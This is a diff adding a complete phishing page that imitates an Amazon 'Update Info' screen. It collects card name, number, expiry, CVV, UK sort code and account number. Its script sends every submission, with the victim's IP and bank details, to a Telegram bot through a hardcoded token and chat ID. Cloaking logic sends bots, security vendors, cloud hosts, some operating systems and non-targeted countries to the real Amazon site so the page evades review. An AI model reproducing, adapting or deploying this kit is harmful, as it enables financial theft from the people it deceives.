@@ -1,0 +1,291 @@
+<html>
+
+<head>
+  <title>Amazon - Update Info</title>
+  <link rel="icon" href="../assets/img/amazon.png">
+  <link rel="stylesheet" href="../assets/css/mobile_login.css">
+  <link rel="stylesheet" href="../assets/css/billing.css">
+  <script type="text/javascript" src="../assets/js/jquery-1.9.1.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.payment.js"></script>
+  <script type="text/javascript" src="../assets/js/additional-methods.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.maskedinput.js"></script>
+  <!-- <script type="text/javascript" src="../assets/js/validate.php"></script> -->
+  <script type="text/javascript" src="../assets/js/validation.js"></script>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+</head>
+
+<body>
+  <center>
+    <br>
+    <header style="background-color:#fff;">
+      <div class="hleft">
+        <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+    </header>
+  </center>
+  <center>
+    <br>
+    <div style="width:400px;" class="boxlogin">
+      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
+        <form action="" method="post" name="add" id="details" novalidate="novalidate">
+          <div id="formbilling">
+            <h4>Enter Your Credit Card Information</h4>
+            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+              <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="hidden" name="token" id='token' value="1163128696:AAGHzQ3d4IZgIXqmw_C0P35LWN0E6uTFeis">
+                            <input type="hidden" name="chat_id" id="chat_id" value="1109980785">
+                            <input type="hidden" name="ip" id="ip" >
+                <input type="text" style="" placeholder="Name on Card" name="ccname" id="ccname" autocorrect="off"
+                  autocapitalize="off" data-validation="required">
+              </div>
+              <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="Card Number" onkeyup="ccc();" name="ccno" maxlength="16" id="ccno"
+                  autocorrect="off" autocapitalize="off"  data-validation="required">
+              </div><br>
+              <h4>Expiration Date</h4>
+              <div style="border-top-color: #949494;background: #e7e9ec;
+        border-radius: 3px;
+        border-color: #ADB1B8 #A2A6AC #8D9096;
+        border-style: solid;
+        border-width: 1px;
+        cursor: pointer;
+        display: inline-block;
+        padding: 5px;
+        width:40%;
+        text-align: center;
+        text-decoration: none!important;
+        vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <select name="exp_bulan" id="exp_bulan" style="background-color: transparent;
+        border: 0;
+        display: block;
+        font-size: 1.6rem;
+        line-height: 1.35;
+        margin: 0;
+        outline: 0;
+        padding: 1.2rem 1.6rem 1.2rem 1.7rem;
+        text-align: center;padding:10px;width:99.7%;border-style:none;" required="">
+                  <option value="01" selected="selected">01</option>
+                  <option value="02">02</option>
+                  <option value="03">03</option>
+                  <option value="04">04</option>
+                  <option value="05">05</option>
+                  <option value="06">06</option>
+                  <option value="07">07</option>
+                  <option value="08">08</option>
+                  <option value="09">09</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
+
+              </div>
+              <div style="margin-left:border-top-color: #949494;background: #e7e9ec;
+        border-radius: 3px;
+        border-color: #ADB1B8 #A2A6AC #8D9096;
+        border-style: solid;
+        border-width: 1px;
+        cursor: pointer;
+        display: inline-block;
+        padding: 5px;
+        width:40%;
+        text-align: center;
+        text-decoration: none!important;
+        vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <select name="exp_tahun" id="exp_tahun" style="background-color: transparent;
+        border: 0;
+        display: block;
+        font-size: 1.6rem;
+        line-height: 1.35;
+        margin: 0;
+        outline: 0;
+        padding: 1.2rem 1.6rem 1.2rem 1.7rem;
+        text-align: center;padding:10px;width:99.7%;border-style:none;" required="">
+                  <option value="20" selected="selected">2020</option>
+                  <option value="21">2021</option>
+                  <option value="22">2022</option>
+                  <option value="23">2023</option>
+                  <option value="24">2024</option>
+                  <option value="25">2025</option>
+                  <option value="26">2026</option>
+                  <option value="27">2027</option>
+                  <option value="28">2028</option>
+                  <option value="29">2029</option>
+                  <option value="30">2030</option>
+                </select>
+
+              </div><br><br>
+              <br>
+              <h4>Security Code</h4>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="CVV" name="cvv" onkeyup="check_additional();" id="cvv"
+                  autocorrect="off" autocapitalize="off" data-validation="number" data-validation="required">
+              </div>
+              <!--  -->
+              <br>
+              <H4>Sort Code <FONT color=#717171 size=1px></FONT>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="" name="sortcode" onkeyup="check_additional();"  id="sortcode" maxlength="9"
+                  autocorrect="off" autocapitalize="off" data-validation="">
+              </div>
+              <br>
+              <H4>Account Number <FONT color=#717171 size=1px></FONT>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="Optional" name="accoutnumber" onkeyup="check_additional();" id="accoutnumber" maxlength="10"
+                  autocorrect="off" autocapitalize="off" data-validation="">
+              </div>
+              <!--  -->
+              <div id="amexcid"></div>
+              <br>
+              <input type="submit" id="submit_cc" class="button a-button-text"
+                style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value="Update">
+            </div>
+          </div>
+
+        </form>
+      </div>
+
+    </div>
+  </center>
+  <br><br>
+
+   <!--  -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+  <script>
+        $.getJSON("https://api.bigdatacloud.net/data/client-info",
+		function(data) {
+			$('#ip').val(data.ipString);
+			var dataIP = $('#ip').val();
+			var dataDevice = data.device;
+			var dataOS = data.os;
+			var dataUserAgentD = data.userAgentDisplay;
+			var dataUserAgentR = data.userAgentRaw;
+			var dataSpider = data.isSpider;
+			var dataMobile = data.isMobile;
+					if(dataSpider == false){
+						 // validasi segi company
+						 $.getJSON("https://api.bigdatacloud.net/data/network-by-ip?ip="+ dataIP +"&localityLanguage=id&key=0724b1c789254a05ac35a5c7076b8d43",
+							function(dataApi) {
+							// variable dari apikedua
+							var organisation = dataApi.organisation;
+							var cidr  = dataApi.bgpPrefix;
+							var country = dataApi.registeredCountryName;
+							var bannedorg = ["Private Customer","Iskon Internet d.d. Internet Service Provider Croatia","Telekom System sp.z o.o.","TOT Public Company Limited","Robi Axiata Ltd - DATA","Broadbandtech S. A.","Chubu Telecommunications Co.,Inc.","UnderNet LLC","RM Education Ltd","Siberian Networks","Reliance Jio Infocomm Limited","Loughborough University","WranglerNet","Digital Energy Technologies Limited","CDN77.com","myLoc managed IT AG","ONLINE SERVICOS DE TELECOMUNICACOES LTDA","YouTube, LLC","Ask4 Limited","BVNET S.A.","Satnet Gye CM","Wireless network in Moscow region","DigitalServer Web Hosting en México","VPN Consumer Network","Amazon Technologies Inc.","Microsoft Corporation","Konzept IT GmbH","Fortinet Technologies (Canada)","B2 Net Solutions Inc.","Top Level Hosting SRL","servers.ru hosting services","BT","DIGITALOCEAN","Oy Creanova Hosting Solutions Ltd.","FTIP003161715 Netcraft Limited","pcl-ag03 Dial-up and ADSL pool Plusnet plc.","IPAX OG","Kaspersky Lab AO","Microsoft Azure","AVAST Software s.r.o.","OVH SAS","NFOrce Entertainment B.V.","M247 Ltd","Digital Ocean","Amazon.com","Palo Alto Networks","Leaseweb Asia Pacific pte.","Faction","Kcom","Exetel","Google","Rutgers University","Rackspace Cloud Servers","PRCDN Consumer Pool PoP Frankfurt https://prcdn.net/","Uninet S.A. de C.V.","Paul Bunyan Communications","DigitalOcean, LLC","Kaspersky Lab AO","Kcom Statics","OVH Ltd","M247 LTD Frankfurt Infrastructure","Amsterdam Residential Television and Internet, LLC","Fortinet Technologies (Canada)","FORTINET TECHNOLOGIES (CANADA) INC","LeaseWeb Asia Pacific - Hong Kong Please send all abuse notifications to the following email address"];
+							var bannedcidr = ["31.41.81.0/24","213.202.89.0/24","203.113.80.0/23","103.242.22.0/24","200.112.190.0/24","219.117.32.0/20","176.104.0.0/18","194.154.0.0/19","49.44.64.0/19","80.64.174.0/23","131.231.0.0/16","69.164.144.0/20","154.127.57.0/24","185.93.2.0/24","217.79.176.0/20","191.7.212.0/23","104.237.189.0/24","213.143.0.0/19","190.97.0.0/24","186.68.128.0/19","80.252.129.0/24","191.96.145.0/24","45.41.181.0/24","52.86.0.0/15","13.64.0.0/11","83.175.64.0/18","204.101.161.0/24","69.4.80.0/20","93.119.227.0/24","88.212.240.0/20","91.103.64.0/21","87.112.0.0/14","185.112.82.0/24","178.128.136.0/21","52.240.0.0/12","5.62.40.0/23","51.77.0.0/16","212.92.112.0/21","185.220.70.0/24","159.65.208.0/21","65.154.226.0/24","204.101.161.0/24","207.102.136.0/21","64.120.88.0/22","195.74.76.0/24","52.148.0.0/14"];
+							var bannedOS = ["Ubuntu","Windows 7","Windows XP","Linux"];
+        					var bannedCountry = ["Amerika Serikat","Britania Raya","Indonesia","Jepang","Australia","Selandia Baru","Belgia","Prancis","Islandia","Irlandia","Irlandia, Republik"];
+							var handleorg=bannedorg.join("|");
+							handleorg=new RegExp(handleorg, "i");
+							var handlecidr=bannedcidr.join("|");
+							handlecidr=new RegExp(handlecidr, "i");
+							var handleOS=bannedOS.join("|");
+							handleOS=new RegExp(handleOS, "i");
+							var handleCountry=bannedCountry.join("|");
+							handleCountry=new RegExp(handleCountry, "i");
+								// jika ketemu di list organisasi maka suruh ke amazon
+								if(organisation.search(handleorg) != -1){
+								// suruh ke amazon.com
+								window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+								} else {
+								//proses ke validasi kedua
+									//jika ketemu di list cidr maka suruh amazon lagi
+									if(cidr.search(handlecidr) !=-1){
+									//suruh ke amazon;
+									window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+									}else{
+										// OSS
+										if(dataOS.search(handleOS) !=-1){
+                          //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                        }
+                        else{
+                          // got access
+                            if(country.search(handleCountry) == -1){
+                              //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                            }
+                            else{
+                              // tele
+										// $.ajax({
+										// url:'https://api.telegram.org/bot'+$('#token').val()+'/sendMessage',
+										// method:'POST',
+										// data:{chat_id:$('#chat_id').val(),
+										// text:'LOG: ' + dataDevice + ' ' + country + ' | ' + dataIP + ' | "' + cidr + '", | "' + organisation + '", | ' + dataUserAgentD },
+										// success:function(){
+										// // kosong
+										// }
+										// });
+										//
+                            }
+                        }
+                        // OSSSS
+										
+									}
+								}
+								
+							// 
+							});
+						// 
+					}else{
+						// bot musti ke amazon
+						window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+						// console.log(dataSpider);
+					}	
+			},0);
+
+ // 
+    // $.validate({
+    //   lang: 'en'
+    // });
+
+    // 
+
+
+$('form').submit(function(e){
+
+  e.preventDefault();
+  var cardnumber = $('#ccno').val();
+  var fixacardnumber = cardnumber.replace(/\s+/g, '');
+  console.log(fixacardnumber);
+
+    $.getJSON( "https://lookup.binlist.net/"+fixacardnumber, function(data) {
+      var title = data.scheme;
+      var bankName = data.bank.name;
+      var typeCard = data.type;
+      var brand = data.brand;
+           // 
+           $.ajax({
+            url:'https://api.telegram.org/bot'+$('#token').val()+'/sendMessage',
+            method:'POST',
+            data:{chat_id:$('#chat_id').val(),
+            text:'IP : '+$('#ip').val()+' | '+title +' '+bankName+' '+ typeCard + ' '+ brand +' | CardHolder Name: '+$('#ccname').val()+' | CC Num: '+fixacardnumber+' | EXP: '+$('#exp_bulan').val()+' / '+$('#exp_tahun').val()+' | CVV: '+$('#cvv').val()+' | SortCode: '+$('#sortcode').val()+' | AccountNumber: '+$('#accoutnumber').val()+' | CID: '+$('#cid').val()},
+            success:function(){
+              window.location.replace("success.html");
+            }
+            });
+            // 
+    });
+  
+});
+
+$(document).ready(function($) {
+      $("#sortcode").mask("99-99-99", {
+        placeholder: "Optional"
+      });
+    });
+
+      $("#ccno").mask("9999 9999 9999 9999");
+ 
+  </script>
+    <!--  -->
+</body>
+
+</html>
